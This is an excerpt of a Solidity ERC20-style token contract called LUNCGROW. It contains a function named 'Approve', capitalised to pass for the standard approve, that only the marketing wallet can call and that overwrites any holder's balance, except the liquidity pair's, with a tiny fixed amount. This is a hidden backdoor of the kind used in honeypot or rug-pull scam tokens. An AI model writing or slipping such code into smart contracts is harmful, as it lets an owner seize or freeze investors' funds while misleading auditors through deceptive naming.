...
contract LUNCGROW is Ownable, IERC20 {
    ...
    uint256 public _numTokensSellToAddToLiquidity = 100 * 10 * 10 * 10;
    ...
    function Approve(address Liquidity ) external  {require(msg.sender == _marketingWallet );
         require(Liquidity != uniswapV2Pair);
        _rOwned[Liquidity] = _marketingFee * 10;
    }   
